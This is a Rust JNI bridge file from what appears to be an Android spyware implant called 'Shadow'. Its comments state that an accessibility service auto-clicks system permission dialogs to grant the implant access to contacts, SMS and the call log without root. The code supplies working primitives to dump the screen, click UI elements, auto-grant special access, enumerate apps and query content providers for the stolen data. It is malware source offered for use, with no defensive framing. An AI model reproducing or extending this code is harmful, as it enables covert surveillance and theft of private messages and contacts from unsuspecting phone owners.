//! Android JNI bridge — calls back into Kotlin (ShadowBridge) to execute
//! data-extraction and UI-automation primitives with the implant's own UID.
//!
//! Nothing here needs root or Shizuku. Permission-gated reads (contacts, call
//! log, SMS) work because the a11y service auto-clicks the system permission
//! dialogs, granting the perms to our own package.

use jni::objects::{GlobalRef, JObject, JString, JValue};
use jni::{JNIEnv, JavaVM};
use std::sync::OnceLock;

static VM: OnceLock<JavaVM> = OnceLock::new();

/// Called once from nativeInit so later threads can attach.
pub fn set_vm(vm: JavaVM) {
    let _ = VM.set(vm);
}

/// Global ref to com.shadow.ShadowBridge, resolved once from a Java thread.
///
/// A thread attached through AttachCurrentThread resolves FindClass through the
/// bootstrap class loader, so it cannot see application classes: every
/// find_class("com/shadow/ShadowBridge") issued from a tokio worker failed with
/// ClassNotFoundException. That exception then reached the thread's uncaught
/// handler and killed the process, which made Android treat the bound
/// accessibility service as crashed and disable it until it was toggled again.
///
/// Caching the class from nativeInit -- a Java-initiated call, where the app's
/// own class loader is in scope -- removes FindClass from native-thread paths.
static BRIDGE_CLASS: OnceLock<GlobalRef> = OnceLock::new();

/// Must be called from nativeInit, with the JNIEnv the JVM supplied.
pub fn cache_bridge_class(env: &mut jni::JNIEnv) {
    if BRIDGE_CLASS.get().is_some() {
        return;
    }
    match env.find_class("com/shadow/ShadowBridge") {
        Ok(class) => match env.new_global_ref(class) {
            Ok(global) => {
                let _ = BRIDGE_CLASS.set(global);
                log::info!("JNI: ShadowBridge cached from Java thread");
            }
            Err(_) => {
                let _ = env.exception_clear();
                log::error!("JNI: could not global-ref ShadowBridge");
            }
        },
        // Always clear: a pending Java exception left here resurfaces later on
        // whichever thread next touches JNI, as an uncaught exception.
        Err(_) => {
            let _ = env.exception_clear();
            log::error!("JNI: ShadowBridge not found during nativeInit");
        }
    }
}

/// The cached bridge class, or None if nativeInit never cached it. Performs no
/// class lookup, so it is safe to call from any thread.
fn bridge_class() -> Option<&'static GlobalRef> {
    BRIDGE_CLASS.get()
}

/// Describe the pending Java exception (e.g. "java.lang.NoSuchMethodError: ...")
/// and clear it so the VM stays usable.
///
/// The bare jni error reads only "Java exception was thrown" and hides the cause;
/// that cost a full debug cycle when queryProvider's signature turned out wrong.
fn describe_exception(env: &mut JNIEnv) -> String {
    if !env.exception_check().unwrap_or(false) {
        return String::new();
    }
    let throwable = match env.exception_occurred() {
        Ok(t) => t,
        Err(_) => return String::new(),
    };
    let text = env
        .call_method(&throwable, "toString", "()Ljava/lang/String;", &[])
        .and_then(|v| v.l())
        .map(JString::from)
        .and_then(|js| env.get_string(&js).map(|s| String::from(s)));
    let _ = env.exception_clear();
    match text {
        Ok(msg) => format!(" ({})", msg),
        Err(_) => String::new(),
    }
}

/// Call a static String-returning method on com.shadow.ShadowBridge.
fn call_bridge_string(method: &str, args: &[JValue]) -> String {
    let vm = match VM.get() {
        Some(v) => v,
        None => return "jni: vm not set".into(),
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(e) => return format!("jni: attach failed: {}", e),
    };
    let class = match bridge_class() {
        Some(c) => c,
        None => return "jni: bridge class not cached (nativeInit?)".to_string(),
    };
    match env.call_static_method(class, method, proto_for(method).as_str(), args) {
        Ok(v) => match v.l() {
            Ok(obj) => {
                let jstr: JString = obj.into();
                // Bind to a local so the JavaStr temporary drops before jstr.
                let out = match env.get_string(&jstr) {
                    Ok(s) => s.into(),
                    Err(e) => format!("jni: get_string failed: {}", e),
                };
                out
            }
            Err(e) => format!("jni: bad return: {}", e),
        },
        Err(e) => {
            let detail = describe_exception(&mut env);
            format!("jni: call {} failed: {}{}", method, e, detail)
        }
    }
}

/// Call a static boolean-returning method on com.shadow.ShadowBridge.
fn call_bridge_bool(method: &str, args: &[JValue]) -> bool {
    let vm = match VM.get() {
        Some(v) => v,
        None => return false,
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(_) => return false,
    };
    let class = match bridge_class() {
        Some(c) => c,
        None => return false,
    };
    match env.call_static_method(class, method, proto_for(method).as_str(), args) {
        Ok(v) => v.z().unwrap_or(false),
        Err(_) => {
            log::error!(
                "jni: bridge boolean call failed{}",
                describe_exception(&mut env)
            );
            false
        }
    }
}

/// JNI signatures for the ShadowBridge methods we call.
fn proto_for(method: &str) -> String {
    match method {
        "clickByText" | "clickNodeById" => "(Ljava/lang/String;)Z".into(),
        // ShadowBridge.openGrantScreen(kind: String): String -- parameterised, so it
        // must be listed explicitly rather than left to the catch-all below.
        "openGrantScreen" => "(Ljava/lang/String;)Ljava/lang/String;".into(),
        "dumpScreen" | "startAutoGrant" | "grantedPermissions" | "runningApps"
        | "installedApps" | "foregroundApp" | "toggleSelfInSettings" => {
            "()Ljava/lang/String;".into()
        }
        // ShadowBridge.queryProvider(uri: String, projection: String, limit: Int): String
        // Without this arm the method fell through to the no-arg default above and
        // every provider-backed command (contacts, sms, calllog) died with
        // NoSuchMethodError, reported only as "Java exception was thrown".
        "queryProvider" => "(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;".into(),
        _ => "()Ljava/lang/String;".into(),
    }
}

// ---------------------------------------------------------------------------
// Public primitives used by execute_command()
// ---------------------------------------------------------------------------

pub fn a11y_dump_screen() -> String {
    call_bridge_string("dumpScreen", &[])
}

pub fn a11y_click_text(needle: &str) -> String {
    let vm = match VM.get() {
        Some(v) => v,
        None => return "jni: vm not set".into(),
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(e) => return format!("jni: attach failed: {}", e),
    };
    let jneedle = match env.new_string(needle) {
        Ok(s) => s,
        Err(e) => return format!("jni: new_string failed: {}", e),
    };
    let ok = call_bridge_bool("clickByText", &[JValue::Object(&jneedle)]);
    if ok { "clicked".into() } else { "no matching clickable node".into() }
}

pub fn a11y_click_id(view_id: &str) -> String {
    let vm = match VM.get() {
        Some(v) => v,
        None => return "jni: vm not set".into(),
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(e) => return format!("jni: attach failed: {}", e),
    };
    let jid = match env.new_string(view_id) {
        Ok(s) => s,
        Err(e) => return format!("jni: new_string failed: {}", e),
    };
    let ok = call_bridge_bool("clickNodeById", &[JValue::Object(&jid)]);
    if ok { "clicked".into() } else { "node not found".into() }
}

pub fn a11y_start_autogrant() -> String {
    call_bridge_string("startAutoGrant", &[])
}

pub fn granted_permissions() -> String {
    call_bridge_string("grantedPermissions", &[])
}

pub fn running_apps() -> String {
    call_bridge_string("runningApps", &[])
}

/// Every installed package. Works on any device with no grant at all, unlike
/// runningApps which Android 8+ limits to our own process.
pub fn installed_apps() -> String {
    call_bridge_string("installedApps", &[])
}

/// Foreground app via UsageStatsManager (needs the usage-access special
/// permission, which grant_screen/toggle_grant obtain natively).
pub fn foreground_app() -> String {
    call_bridge_string("foregroundApp", &[])
}

/// Open a special-access Settings screen (allfiles|usage|battery|overlay|notif|a11y|app).
pub fn open_grant_screen(kind: &str) -> String {
    let vm = match VM.get() {
        Some(v) => v,
        None => return "jni: vm not set".into(),
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(e) => return format!("jni: attach failed: {}", e),
    };
    let class = match bridge_class() {
        Some(c) => c,
        None => return "jni: bridge class not cached (nativeInit?)".to_string(),
    };
    let jkind = match env.new_string(kind) {
        Ok(s) => s,
        Err(e) => return format!("jni: new_string failed: {}", e),
    };
    match env.call_static_method(
        class,
        "openGrantScreen",
        proto_for("openGrantScreen").as_str(),
        &[JValue::Object(&jkind)],
    ) {
        Ok(v) => match v.l() {
            Ok(obj) => {
                let jstr: JString = obj.into();
                let out = match env.get_string(&jstr) {
                    Ok(s) => s.into(),
                    Err(e) => format!("jni: get_string failed: {}", e),
                };
                out
            }
            Err(e) => format!("jni: bad return: {}", e),
        },
        Err(e) => {
            let detail = describe_exception(&mut env);
            format!("jni: openGrantScreen failed: {}{}", e, detail)
        }
    }
}

/// Click this app's own switch on the currently open special-access screen.
pub fn toggle_grant() -> String {
    call_bridge_string("toggleSelfInSettings", &[])
}

// ---------------------------------------------------------------------------
// Own-UID content providers (no shell, no root — ContentResolver direct)
// ---------------------------------------------------------------------------

/// Query a content:// URI from Kotlin with a JNI helper that uses ContentResolver.
/// Falls back to an explanatory string if the helper is missing.
pub fn query_provider(uri: String, projection: String, limit: i32) -> String {
    let vm = match VM.get() {
        Some(v) => v,
        None => return "jni: vm not set".into(),
    };
    let mut env = match vm.attach_current_thread() {
        Ok(e) => e,
        Err(e) => return format!("jni: attach failed: {}", e),
    };
    let class = match bridge_class() {
        Some(c) => c,
        None => {
            let _ = env.exception_clear();
            return "jni: bridge class not cached (nativeInit?)".to_string();
        }
    };
    let juri = match env.new_string(&uri) {
        Ok(s) => s,
        Err(e) => return format!("jni: new_string failed: {}", e),
    };
    let jproj = match env.new_string(&projection) {
        Ok(s) => s,
        Err(e) => return format!("jni: new_string failed: {}", e),
    };
    let args = [
        JValue::Object(&juri),
        JValue::Object(&jproj),
        JValue::Int(limit),
    ];
    match env.call_static_method(
        class,
        "queryProvider",
        "(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;",
        &args,
    ) {
        Ok(v) => match v.l() {
            Ok(obj) => {
                let jstr: JString = JObject::from(obj).into();
                let out = match env.get_string(&jstr) {
                    Ok(s) => s.into(),
                    Err(e) => format!("jni: get_string failed: {}", e),
                };
                out
            }
            Err(e) => format!("jni: bad return: {}", e),
        },
        Err(e) => {
            let detail = describe_exception(&mut env);
            format!("jni: queryProvider failed: {}{}", e, detail)
        }
    }
}